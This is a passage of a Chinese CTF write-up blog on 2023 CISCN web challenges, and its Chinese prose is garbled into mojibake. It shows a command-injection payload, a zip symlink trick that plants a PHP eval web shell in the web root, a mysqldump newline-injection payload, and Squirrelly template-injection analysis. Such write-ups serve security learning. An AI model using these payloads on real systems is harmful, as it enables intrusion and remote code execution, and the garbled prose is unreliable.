<p>å¦‚ä¿®æ”¹åçš„ä»£ç çŸ¥é“ï¼Œ<code>server.py</code>ä¼šæ‰§è¡Œ<code>name</code>å‚æ•°ä¸­çš„å‘½ä»¤ï¼Œä»è€Œå®ç°</p>
</blockquote>
<img src="/post/2023CISCN%E5%88%9D%E8%B5%9B/image-20230617185023757.png" alt="image-20230617185023757" style="zoom:80%;">

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">/flask?name=?name=<span class="built_in">cat</span><span class="variable">$&#123;IFS&#125;</span>/th1s_1s_f13g</span><br></pre></td></tr></table></figure>

<img src="/post/2023CISCN%E5%88%9D%E8%B5%9B/image-20230617170612349.png" alt="image-20230617170612349" style="zoom:80%;">

<p>å¾—å¾—flagï¼ˆnndï¼Œflagåå­—å°±ä¸èƒ½æ­£å¸¸ä¸€ç‚¹å—ï¼Œä¸ç„¶è¯»æ–‡ä»¶å°±è§£å†³äº†</p>
<p>ç»“æŸ</p>
<h1 id="reading"><a href="#reading" class="headerlink" title="reading"></a>reading</h1><blockquote>
<p>é¢˜ç›®å†…å®¹ï¼š</p>
<p>è¯»ç‚¹ä»€ä¹ˆå‘¢ï¼Ÿ</p>
</blockquote>
<p>ä¸è“å¸½æ¯è¿™é“<code>file_session</code>é¢˜ç›®å¾ˆåƒ<a href="https://forum.butian.net/share/1760">å¥‡å®‰ä¿¡æ”»é˜²ç¤¾åŒº-2022è“å¸½æ¯åˆèµ›WriteUp (butian.net)</a></p>
<h1 id="unzip"><a href="#unzip" class="headerlink" title="unzip"></a>unzip</h1><blockquote>
<p>é¢˜ç›®å†…å®¹ï¼š</p>
<p>unzipå¾ˆç®€å•ï¼Œä½†æ˜¯åŒæ ·ä¹Ÿå¾ˆå±é™©</p>
</blockquote>
<p>å‡ ä¹åŸé¢˜[<a href="https://bbs.kanxue.com/thread-270353.htm#msg_header_h3_4">åŸåˆ›]2021æ·±è‚²æ¯çº¿ä¸Šåˆèµ›å®˜æ–¹WriteUp-CTFå¯¹æŠ—-çœ‹é›ª-å®‰å…¨ç¤¾åŒº|å®‰å…¨æ‹›è˜|kanxue.com</a></p>
<p>å¼€å§‹ä¸Šä¼ </p>
<img src="/post/2023CISCN%E5%88%9D%E8%B5%9B/image-20230824095547698.png" alt="image-20230824095547698" style="zoom:80%;">

<p>é¡µé¢è·³è½¬åˆ°<code>upload.php</code>ä»£ç åˆ†æ</p>
<h2 id="ä»£ç åˆ†æä»¥åŠæµç¨‹"><a href="#ä»£ç åˆ†æä»¥åŠæµç¨‹" class="headerlink" title="ä»£ç åˆ†æä»¥åŠæµç¨‹"></a>ä»£ç åˆ†æä»¥åŠæµç¨‹</h2><img src="/post/2023CISCN%E5%88%9D%E8%B5%9B/image-20230824100144547.png" alt="image-20230824100144547" style="zoom:80%;">

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$finfo</span> = <span class="title function_ invoke__">finfo_open</span>(FILEINFO_MIME_TYPE);</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">finfo_file</span>(<span class="variable">$finfo</span>, <span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;tmp_name&quot;</span>]) === <span class="string">&#x27;application/zip&#x27;</span>)&#123;</span><br><span class="line">    <span class="title function_ invoke__">exec</span>(<span class="string">&#x27;cd /tmp &amp;&amp; unzip -o &#x27;</span> . <span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;tmp_name&quot;</span>]);</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">//only this!</span></span><br></pre></td></tr></table></figure>

<p> é¦–å…ˆå¯¹ä¸Šä¼ æ–‡ä»¶çš„ç±»å‹è¿›è¡Œäº†åˆ¤æ–­</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">finfo_file</span>(<span class="variable">$finfo</span>, <span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;tmp_name&quot;</span>]) === <span class="string">&#x27;application/zip&#x27;</span>)</span><br></pre></td></tr></table></figure>

<p>éœ€è¦ä¸Šä¼ çš„æ–‡ä»¶ç±»å‹ä¸º<code>application/zip</code>ï¼Œç„¶åæ‰§è¡Œ</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">exec</span>(<span class="string">&#x27;cd /tmp &amp;&amp; unzip -o &#x27;</span> . <span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;tmp_name&quot;</span>]);</span><br></pre></td></tr></table></figure>

<h3 id="è½¯é“¾æ¥"><a href="#è½¯é“¾æ¥" class="headerlink" title="è½¯é“¾æ¥"></a>è½¯é“¾æ¥</h3><p>å‘ç°ä¸Šä¼ çš„å‹ç¼©åŒ…ä¸­æ–‡ä»¶éƒ½è¢«è§£å‹åœ¨äº†<code>tmp</code>ç›®å½•ä¸‹ï¼Œå¦‚æœæƒ³è¦è®¿é—®ï¼Œå°±éœ€è¦åˆ©ç”¨è½¯é“¾æ¥ï¼Œä»<code>/tmp</code>é“¾æ¥åˆ°<code>/var/www/html</code></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">ln</span> -s /var/www/html <span class="built_in">test</span></span><br></pre></td></tr></table></figure>

<img src="/post/2023CISCN%E5%88%9D%E8%B5%9B/image-20230824095110642.png" alt="image-20230824095110642" style="zoom:80%;">

<p>ä½†æ˜¯æƒ³è¦æŠŠè½¯é“¾æ¥æ‰“åŒ…åœ¨å‹ç¼©åŒ…ä¸­ï¼Œéœ€è¦åŠ ä¸Šå‚æ•°<code>--symlinks</code>ï¼Œå¦‚æœä¸åŠ ä¸Šï¼Œå‹ç¼©è½¯é“¾æ¥ä¼šæŠŠå®ƒä»¬æŒ‡å‘çš„å®é™…æ–‡ä»¶æˆ–æ–‡ä»¶å¤¹å‹ç¼©è¿›å»ï¼Œè€Œä¸æ˜¯ä¿ç•™è½¯é“¾æ¥æœ¬èº«ã€‚</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">zip --symlinks <span class="built_in">test</span> ./*</span><br></pre></td></tr></table></figure>

<p>è¿™æ ·<code>test</code>å°±æŒ‡å‘äº†<code>/var/www/html</code></p>
<img src="/post/2023CISCN%E5%88%9D%E8%B5%9B/image-20230824105720266.png" alt="image-20230824105720266" style="zoom:80%;">

<h3 id="æ„é€ æœ¨é©¬å‹ç¼©åŒ…"><a href="#æ„é€ æœ¨é©¬å‹ç¼©åŒ…" class="headerlink" title="æ„é€ æœ¨é©¬å‹ç¼©åŒ…"></a>æ„é€ æœ¨é©¬å‹ç¼©åŒ…</h3><p>ç„¶åå»ºä¸€ä¸ªç›¸åŒåå­—çš„æ–‡ä»¶å¤¹<code>test</code>ï¼Œå‘å…¶ä¸­æ”¾å…¥ä¸€å¥è¯ğŸ</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;?php @eval($_POST[&quot;cmd&quot;]);?&gt;&#x27;</span> &gt; shell.php</span><br></pre></td></tr></table></figure>

<p><img src="/post/2023CISCN%E5%88%9D%E8%B5%9B/image-20230824105344292.png" alt="image-20230824105344292"></p>
<p>ç„¶åå°†è¿™ä¸ªæ–°å»ºçš„ä¸”åŒ…å«ä¸€å¥è¯ğŸ<code>test</code>æ–‡ä»¶å¤¹æ‰“åŒ…æˆå‹ç¼©åŒ…<code>test1.zip</code></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">zip -r test1.zip <span class="built_in">test</span></span><br></pre></td></tr></table></figure>

<img src="/post/2023CISCN%E5%88%9D%E8%B5%9B/image-20230824105800293.png" alt="image-20230824105800293" style="zoom: 80%;">

<h3 id="p-s-ä¸ºä»€ä¹ˆå‘¢ï¼Ÿ"><a href="#p-s-ä¸ºä»€ä¹ˆå‘¢ï¼Ÿ" class="headerlink" title="p.s.ä¸ºä»€ä¹ˆå‘¢ï¼Ÿ"></a>p.s.ä¸ºä»€ä¹ˆå‘¢ï¼Ÿ</h3><blockquote>
<p>è¿™é‡Œçš„test1.zipä¸­åŒ…å«çš„æ–‡ä»¶å¤¹åå’Œè½¯é“¾æ¥çš„åå­—æ˜¯ä¸€æ ·çš„ï¼Œå½“å‹ç¼©åŒ…åœ¨å’Œè½¯é“¾æ¥ç›¸åŒçš„è·¯å¾„ä¸‹è§£å‹æ—¶ï¼Œå› ä¸ºç›¸åŒåå­—çš„æ–‡ä»¶ä¸èƒ½å‡ºç°åœ¨åŒæ„è·¯å¾„ä¸‹ï¼Œæ‰€ä»¥å½“ä¸€ä¸ªç›¸åŒåå­—çš„æ–‡ä»¶å¤¹æƒ³è¦è§£å‹åˆ°æœ‰ä¸ªç›¸åŒåå­—çš„è½¯é“¾æ¥æ—¶ï¼Œ</p>
<p>è§£å‹å‘½ä»¤ä¼šæŠŠ<code>è½¯é“¾æ¥çš„æŒ‡å‘è·¯å¾„</code>å½“ä½œ<code>æ–‡ä»¶å¤¹åå­—</code>ï¼Œä»è€Œå®ç°å°†æˆ‘ä»¬è¿™é‡Œçš„ä¸€å¥è¯ğŸç§»åˆ°<code>/var/www/html</code>ä¸‹é¢</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">unzip -o test1.zip</span><br></pre></td></tr></table></figure>

<p>-oèµ·åˆ°çš„æ˜¯å¼ºåˆ¶è¦†ç›–æ–‡ä»¶çš„ä½œç”¨ï¼Œä½†æ˜¯åªè¦†ç›–æ™®é€šæ–‡ä»¶ï¼Œåƒæ–‡ä»¶å¤¹å’Œè½¯é“¾æ¥ä¸ä¼šè¢«è¦†ç›–ï¼Œæ‰€ä»¥è¿™é‡Œå°±ä¸éœ€è¦æ‹…å¿ƒè§£å‹ç›¸åŒåå­—çš„æ–‡ä»¶å¤¹åœ¨å½“å‰ç›®å½•ä¼šæŠŠè½¯é“¾æ¥è¦†ç›–ï¼Œå…¶å®ç›¸åçš„ï¼Œè½¯é“¾æ¥æŒ‡å‘çš„è·¯å¾„åè€Œæ›¿ä»£äº†æ–‡ä»¶å¤¹çš„åå­—</p>
</blockquote>
<p>å¦‚ä¸‹æ‰€ç¤ºï¼Œ</p>
<img src="/post/2023CISCN%E5%88%9D%E8%B5%9B/image-20230824112017717.png" alt="image-20230824112017717" style="zoom:67%;">

<blockquote>
<p>å¯ä»¥çœ‹åˆ°æˆ‘ä»¬çš„<code>shell.php</code>è¢«è§£å‹åˆ°äº†<code>test</code>è½¯é“¾æ¥æ‰€æŒ‡å‘çš„è·¯å¾„</p>
</blockquote>
<h2 id="è§£é¢˜"><a href="#è§£é¢˜" class="headerlink" title="è§£é¢˜"></a>è§£é¢˜</h2><p>å…ˆå°†æˆ‘ä»¬çš„<code>åŒ…å«è½¯é“¾æ¥</code>çš„å‹ç¼©åŒ…<code>test.zip</code>ä¸Šä¼ ä¸Šå»ï¼Œé¿å…å¦‚æœå…ˆä¸Šä¼ åŒ…å«æœ¨é©¬çš„ï¼Œä¼šè¢«<code>test</code>æ–‡ä»¶å¤¹å ç”¨ä½ç½®</p>
<p>è¿›è¡Œä¸Šä¼ ï¼Œè™½ç„¶ä¸Šä¼ åå’Œä¹‹å‰ä¸€æ ·ä¼šå›åˆ°<code>upload.php</code>ï¼Œä½†æ˜¯è¿›å…¥dockerä¸­å¯ä»¥çœ‹åˆ°æ˜¯å‹ç¼©åŒ…ç¡®å®ä¸Šä¼ è§£å‹æˆåŠŸäº†</p>
<img src="/post/2023CISCN%E5%88%9D%E8%B5%9B/image-20230824112559662.png" alt="image-20230824112559662" style="zoom:67%;">

<img src="/post/2023CISCN%E5%88%9D%E8%B5%9B/image-20230824112546836.png" alt="image-20230824112546836" style="zoom:67%;">

<p>ç„¶åæˆ‘ä»¬å†ä¸Šä¼ <code>test1.zip</code>ï¼Œæ ¹æ®æˆ‘ä»¬ä¹‹å‰åˆ†æçš„ï¼Œä¼šå°†å…¶ä¸­çš„<code>test</code>æ–‡ä»¶å¤¹ä¸‹çš„æœ¨é©¬è§£å‹åˆ°<code>/var/www/html</code>ä¸‹ï¼Œä¹Ÿå°±æ˜¯é¦–é¡µ</p>
<p>æ“ä½œåŒä¸Šï¼Œå‘ç°<code>shell.php</code>ç¡®å®ä¸Šä¼ åˆ°ç½‘ç«™é¦–é¡µ</p>
<img src="/post/2023CISCN%E5%88%9D%E8%B5%9B/image-20230824112959092.png" alt="image-20230824112959092" style="zoom: 80%;">

<p>ç›´æ¥è¿æ¥</p>
<img src="/post/2023CISCN%E5%88%9D%E8%B5%9B/image-20230824113240803.png" alt="image-20230824113240803" style="zoom:67%;">

<img src="/post/2023CISCN%E5%88%9D%E8%B5%9B/image-20230824113300506.png" alt="image-20230824113300506" style="zoom:67%;">

<p>å¾—åˆ°<code>flag</code></p>
<img src="/post/2023CISCN%E5%88%9D%E8%B5%9B/image-20230824113320280.png" alt="image-20230824113320280" style="zoom: 67%;">

<p>ç»“æŸ</p>
<h1 id="DebugSer"><a href="#DebugSer" class="headerlink" title="DebugSer"></a>DebugSer</h1><blockquote>
<p>é¢˜ç›®å†…å®¹ï¼š</p>
<p>è¿œç¨‹ç¯å¢ƒ<code>jdk1.8.0_20</code></p>
<p>æ›´æ–°æç¤º1ï¼š<code>cn.hutool.json.JSONObject.put-&gt;com.app.Myexpect#getAnyexcept</code></p>
</blockquote>
<p> è€ƒå¯Ÿccé“¾çš„æ”¹é€ </p>
<h1 id="BackendService"><a href="#BackendService" class="headerlink" title="BackendService"></a>BackendService</h1><blockquote>
<p>é¢˜ç›®å†…å®¹ï¼š</p>
<p>å°æ˜æ‹¿åˆ°äº†å†…ç½‘ä¸€ä¸ªè€æ—§æœåŠ¡çš„åº”ç”¨åŒ…ï¼Œè™½ç„¶æœ‰æ¼æ´ä½†æ˜¯æ€ä¹ˆåˆ©ç”¨ä»–å‘¢ï¼Ÿ[æ³¨æ„ï¼šå¹³å°é¢˜ç›®ä¸‹å‘åè¯·è®¿é—®&#x2F;nacosè·¯ç”±]</p>
</blockquote>
<p><code>CVE-2022-22947æ”¹äº†ä¸€äº›ä»£ç </code> </p>
<blockquote>
<p><a href="https://xz.aliyun.com/t/11493">Nacosç»“åˆSpring Cloud Gateway RCEåˆ©ç”¨</a></p>
</blockquote>
<h1 id="dumpit"><a href="#dumpit" class="headerlink" title="dumpit"></a>dumpit</h1><blockquote>
<p>é¢˜ç›®å†…å®¹ï¼š</p>
<p>flag in &#x2F;flag</p>
</blockquote>
<p>æ‰¾ä¸åˆ°ç¯å¢ƒäº†ï¼Œå°±æ˜¯å¥½åƒç›´æ¥å¯ä»¥æ‰§è¡Œå‘½ä»¤ï¼Œåˆ©ç”¨<code>mysqldump</code></p>
<p>flagå°±åœ¨ç¯å¢ƒå˜é‡é‡Œï¼Œæ‰§è¡Œ<code>env</code>å³å¯ï¼Œå°±æ˜¯éœ€è¦åˆ†éš”ç¬¦</p>
<p><code>payload</code>ä¸º</p>
<blockquote>
<p><code>/?db=&amp;table_2_dump=%0a%20env</code></p>
</blockquote>
<p>ç¯å¢ƒå˜é‡ä¸­å³å¯çœ‹åˆ°flag</p>
]]></content>
      <categories>
        <category>ç½‘ç»œå®‰å…¨å­¦ä¹ </category>
      </categories>
      <tags>
        <tag>Game</tag>
      </tags>
  </entry>
  <entry>
    <title>2023CISCNåå—</title>
    <url>//post/2023CISCN%E5%8D%8E%E5%8D%97/</url>
    <content><![CDATA[<p><code>2023å›½èµ›åå—èµ›åŒºé¢˜ç›®å­¦ä¹ </code></p>
<span id="more"></span>

<h1 id="OwnSquirrelly"><a href="#OwnSquirrelly" class="headerlink" title="OwnSquirrelly"></a>OwnSquirrelly</h1><blockquote>
<p><a href="https://github.com/squirrellyjs/squirrelly">Squirrelly</a> æ˜¯ä¸€ä¸ªç”¨ JavaScript å®ç°çš„ç°ä»£ã€å¯é…ç½®ä¸”é€Ÿåº¦æå¿«çš„æ¨¡æ¿å¼•æ“ã€‚å®ƒä¸ ExpressJS ä¸€èµ·å¼€ç®±å³ç”¨ï¼Œå®Œæ•´ç‰ˆçš„ gzip å‹ç¼©åä»…é‡çº¦ 4KBã€‚</p>
</blockquote>
<p><code>app.js</code>ï¼Œå‘ç°é¢˜ç›®æ˜¯nodejsç¼–å†™çš„ç½‘ç«™æœåŠ¡ï¼Œç«¯å£3000</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> createError = <span class="built_in">require</span>(<span class="string">&#x27;http-errors&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> express = <span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> session = <span class="built_in">require</span>(<span class="string">&#x27;express-session&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> squirrelly = <span class="built_in">require</span>(<span class="string">&#x27;squirrelly&#x27;</span>)</span><br><span class="line"><span class="keyword">var</span> randomize = <span class="built_in">require</span>(<span class="string">&#x27;randomatic&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> path = <span class="built_in">require</span>(<span class="string">&#x27;path&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> cookieParser = <span class="built_in">require</span>(<span class="string">&#x27;cookie-parser&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> logger = <span class="built_in">require</span>(<span class="string">&#x27;morgan&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> utils = <span class="built_in">require</span>(<span class="string">&#x27;./utils&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> indexRouter = <span class="built_in">require</span>(<span class="string">&#x27;./routes/index&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> usersRouter = <span class="built_in">require</span>(<span class="string">&#x27;./routes/users&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> app = <span class="title function_">express</span>();</span><br><span class="line"></span><br><span class="line"><span class="comment">// view engine setup</span></span><br><span class="line">app.<span class="title function_">set</span>(<span class="string">&#x27;views&#x27;</span>, path.<span class="title function_">join</span>(__dirname, <span class="string">&#x27;views&#x27;</span>));</span><br><span class="line">app.<span class="title function_">set</span>(<span class="string">&#x27;view engine&#x27;</span>, <span class="string">&#x27;squirrelly&#x27;</span>);</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">use</span>(<span class="title function_">logger</span>(<span class="string">&#x27;dev&#x27;</span>));</span><br><span class="line">app.<span class="title function_">use</span>(express.<span class="title function_">json</span>());</span><br><span class="line">app.<span class="title function_">use</span>(express.<span class="title function_">urlencoded</span>(&#123; <span class="attr">extended</span>: <span class="literal">true</span> &#125;));</span><br><span class="line">app.<span class="title function_">use</span>(<span class="title function_">cookieParser</span>());</span><br><span class="line">app.<span class="title function_">use</span>(express.<span class="title function_">static</span>(path.<span class="title function_">join</span>(__dirname, <span class="string">&#x27;public&#x27;</span>)));</span><br><span class="line"></span><br><span class="line"><span class="comment">// start session</span></span><br><span class="line">app.<span class="title function_">use</span>(<span class="title function_">session</span>(&#123;</span><br><span class="line">  <span class="attr">name</span>: <span class="string">&#x27;thejs.session&#x27;</span>,</span><br><span class="line">  <span class="attr">secret</span>: <span class="title function_">randomize</span>(<span class="string">&#x27;Ye0h&#x27;</span>, <span class="number">16</span>),</span><br><span class="line"><span class="comment">//randomizeçš„ç¬¬ä¸€ä¸ªå‚æ•°æ˜¯ç”Ÿæˆçš„å­—ç¬¦ä¸²çš„é•¿åº¦ï¼Œç¬¬äºŒä¸ªå‚æ•°æ˜¯ç”Ÿæˆçš„å­—ç¬¦ä¸²çš„å­—ç¬¦èŒƒå›´</span></span><br><span class="line"><span class="comment">//randomizeçš„ä½œç”¨æ˜¯ç”Ÿæˆä¸€ä¸ªéšæœºçš„å­—ç¬¦ä¸²ï¼Œç”¨äºåŠ å¯†session</span></span><br><span class="line">  <span class="attr">resave</span>: <span class="literal">true</span>,</span><br><span class="line">  <span class="attr">saveUninitialized</span>: <span class="literal">true</span></span><br><span class="line">&#125;))</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">use</span>(<span class="string">&#x27;/&#x27;</span>, indexRouter);</span><br><span class="line">app.<span class="title function_">use</span>(<span class="string">&#x27;/users&#x27;</span>, usersRouter);</span><br><span class="line"></span><br><span class="line"><span class="comment">// catch 404 and forward to error handler</span></span><br><span class="line">app.<span class="title function_">use</span>(<span class="keyword">function</span>(<span class="params">req, res, next</span>) &#123;</span><br><span class="line">  <span class="title function_">next</span>(<span class="title function_">createError</span>(<span class="number">404</span>));</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> server = app.<span class="title function_">listen</span>(<span class="number">3000</span>, <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">var</span> host = server.<span class="title function_">address</span>().<span class="property">address</span></span><br><span class="line">  <span class="keyword">var</span> port = server.<span class="title function_">address</span>().<span class="property">port</span></span><br><span class="line"></span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;Listening on http://%s:%s&quot;</span>, host, port)</span><br><span class="line">&#125;);</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>è®¿é—®ï¼Œå‘ç°æ˜¯ä¸€ä¸ªloginé¡µé¢</p>
<p><img src="/post/2023CISCN%E5%8D%8E%E5%8D%97/image-20230701223652900.png" alt="image-20230701223652900"></p>
<p>ç‚¹å‡»ç™»å½•ï¼Œè·³è½¬åˆ°Registeré¡µé¢</p>
<p><img src="/post/2023CISCN%E5%8D%8E%E5%8D%97/image-20230703231445526.png" alt="image-20230703231445526"></p>
<p>ä½†æ˜¯æ³¨å†ŒæŠ¥é”™ï¼Œçœ‹çœ‹<code>users.js</code></p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// init database</span></span><br><span class="line"><span class="keyword">var</span> connection  = mysql.<span class="title function_">createConnection</span>(&#123;</span><br><span class="line">  <span class="attr">host</span>:<span class="string">&#x27;localhost&#x27;</span>,</span><br><span class="line">  <span class="attr">user</span>:<span class="string">&#x27;root&#x27;</span>,</span><br><span class="line">  <span class="attr">password</span>:<span class="string">&#x27;123456&#x27;</span>,</span><br><span class="line">  <span class="attr">database</span>:<span class="string">&#x27;ctf&#x27;</span></span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<p>å‘ç°æœ‰ä¸ªåˆå§‹åŒ–æ•°æ®åº“ï¼Œå†çœ‹çœ‹åˆ—åå’Œæ•°æ®è¡¨å</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(req.<span class="property">method</span> == <span class="string">&quot;POST&quot;</span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> username = req.<span class="property">body</span>.<span class="property">username</span>;</span><br><span class="line">    <span class="keyword">var</span> password = req.<span class="property">body</span>.<span class="property">password</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (username !== <span class="literal">undefined</span> &amp;&amp; password !== <span class="literal">undefined</span>) &#123;</span><br><span class="line">      <span class="keyword">var</span> querySql = <span class="string">&quot;select * from users where username = ?&quot;</span>;</span><br><span class="line">      connection.<span class="title function_">query</span>(querySql, [username], <span class="keyword">function</span>(<span class="params">err, result</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span>(err) &#123;</span><br><span class="line">          <span class="keyword">return</span> res.<span class="title function_">render</span>(<span class="string">&#x27;register&#x27;</span>, &#123; </span><br><span class="line">            <span class="attr">message</span>: <span class="string">&#x27;Error!&#x27;</span></span><br><span class="line">          &#125;);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        result = <span class="title class_">JSON</span>.<span class="title function_">parse</span>(<span class="title class_">JSON</span>.<span class="title function_">stringify</span>(result))[<span class="number">0</span>];</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(result &amp;&amp; result.<span class="property">username</span> !== <span class="literal">undefined</span>) &#123;</span><br><span class="line">          <span class="keyword">return</span> res.<span class="title function_">render</span>(<span class="string">&#x27;register&#x27;</span>, &#123; </span><br><span class="line">            <span class="attr">message</span>: <span class="string">&#x27;User already exists.&#x27;</span> </span><br><span class="line">          &#125;);</span><br><span class="line">        &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">          <span class="keyword">var</span> insertSql = <span class="string">&quot;insert into users (`username`, `password`) value (?, ?)&quot;</span>;</span><br><span class="line">          connection.<span class="title function_">query</span>(insertSql, [username, utils.<span class="title function_">md5</span>(password)], <span class="keyword">function</span>(<span class="params">err, result</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span>(err) &#123;</span><br><span class="line">              <span class="keyword">return</span> res.<span class="title function_">render</span>(<span class="string">&#x27;register&#x27;</span>, &#123; </span><br><span class="line">                <span class="attr">message</span>: <span class="string">&#x27;Error!&#x27;</span> </span><br><span class="line">              &#125;);</span><br><span class="line">            &#125;</span><br><span class="line">          <span class="keyword">return</span> res.<span class="title function_">render</span>(<span class="string">&#x27;register&#x27;</span>, &#123; </span><br><span class="line">            <span class="attr">message</span>: <span class="string">&#x27;Register successed.&#x27;</span> </span><br><span class="line">          &#125;);</span><br><span class="line">          &#125;);</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<p>äºæ˜¯æ„å»ºè¯¥æ•°æ®åº“å’Œå¯¹åº”è¡¨å’Œåˆ—</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> database ctf;</span><br><span class="line">use ctf;</span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> users (</span><br><span class="line">  id <span class="type">INT</span> <span class="keyword">NOT</span> <span class="keyword">NULL</span> AUTO_INCREMENT,</span><br><span class="line">  username <span class="type">VARCHAR</span>(<span class="number">50</span>) <span class="keyword">NOT</span> <span class="keyword">NULL</span>,</span><br><span class="line">  password <span class="type">VARCHAR</span>(<span class="number">255</span>) <span class="keyword">NOT</span> <span class="keyword">NULL</span>,</span><br><span class="line">  <span class="keyword">PRIMARY</span> KEY (id)</span><br><span class="line">);</span><br></pre></td></tr></table></figure>

<p><img src="/post/2023CISCN%E5%8D%8E%E5%8D%97/image-20230703232247545.png" alt="image-20230703232247545"></p>
<p>æ³¨å†ŒæˆåŠŸï¼Œè¿›è¡Œç™»å½•</p>
<p><img src="/post/2023CISCN%E5%8D%8E%E5%8D%97/image-20230703232345400.png" alt="image-20230703232345400"></p>
<hr>
<p>æŸ¥çœ‹ä»£ç ï¼Œåˆ†æé¢˜ç›®ï¼Œå‘ç°æ˜¯<code>Squirrel</code>æ˜¯ä¸€ä¸ªæ¨¡æ¿å¼•æ“ï¼Œæ‰€ä»¥çŒœæµ‹æ”¹ä»£ç ä¸­å­˜åœ¨<code>ssti</code>ï¼Œæˆ–è€…<code>XSS</code>ï¼Œæˆ–è€…<code>RCE</code></p>
<p>ä½†æ˜¯è€ƒè™‘åˆ°æ¯”èµ›ä¸å‡ºç½‘ï¼Œæ‰€ä»¥å…ˆè‡ªå·±å¯»æ‰¾æ³¨å…¥ç‚¹</p>
<p>ä¸‹é¢æ˜¯ä¸¤ç¯‡å‚è€ƒæ–‡ç« ï¼Œ</p>
<blockquote>
<p><a href="https://nvd.nist.gov/vuln/detail/CVE-2021-32819">NVD - CVE-2021-32819 (nist.gov)</a></p>
<p><a href="https://www.freebuf.com/vuls/276112.html">æ¼æ´åˆ†æï¼šCVE-2021-32819 - FreeBufç½‘ç»œå®‰å…¨è¡Œä¸šé—¨æˆ·</a></p>
</blockquote>
<p>å› ä¸ºæ˜¯<code>js</code>ï¼Œæ‰€ä»¥æŸ¥çœ‹<code>res.render</code>å­˜åœ¨çš„åœ°æ–¹ï¼Œå¯»æ‰¾å¯ä»¥æ§åˆ¶çš„å‚æ•°</p>
<p>å‘ç°</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* GET users listing. */</span></span><br><span class="line">router.<span class="title function_">get</span>(<span class="string">&#x27;/&#x27;</span>, <span class="keyword">function</span>(<span class="params">req, res, next</span>) &#123;</span><br><span class="line">  <span class="keyword">if</span> (req.<span class="property">session</span>.<span class="property">userID</span> === <span class="literal">undefined</span> || req.<span class="property">session</span>.<span class="property">userID</span> === <span class="literal">null</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> res.<span class="title function_">redirect</span>(<span class="string">&#x27;/users/login&#x27;</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!utils.<span class="title function_">isSafeObj</span>(req.<span class="property">query</span>.<span class="property">information</span>))</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">return</span> res.<span class="title function_">render</span>(<span class="string">&#x27;home&#x27;</span>, &#123; <span class="attr">username</span>: req.<span class="property">session</span>.<span class="property">userID</span> &#125;);</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> res.<span class="title function_">render</span>(<span class="string">&#x27;home&#x27;</span>, req.<span class="property">query</span>.<span class="property">information</span>)</span><br><span class="line">      <span class="comment">//è¿™é‡Œçš„req.query.informationæ˜¯ä¸€ä¸ªå¯¹è±¡ï¼Œæ‰€ä»¥å¯ä»¥ç›´æ¥ä¼ å…¥</span></span><br><span class="line">      <span 